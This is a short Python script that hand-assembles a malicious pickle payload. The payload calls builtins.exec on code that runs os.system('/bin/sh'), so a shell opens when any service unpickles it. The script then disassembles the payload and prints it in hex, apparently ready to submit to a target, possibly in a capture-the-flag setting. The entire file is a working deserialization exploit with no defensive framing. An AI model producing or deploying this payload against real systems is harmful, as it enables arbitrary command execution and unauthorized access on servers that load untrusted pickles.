from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'
p += GLOBAL
p += b'builtins\n'
p += b'exec\n'
p += STRING
p += b'"__import__(\'os\').system(\'/bin/sh\')"\n'
p += TUPLE1
p += REDUCE
p += STOP

dis(p)
print("="*50)
print(p.hex())
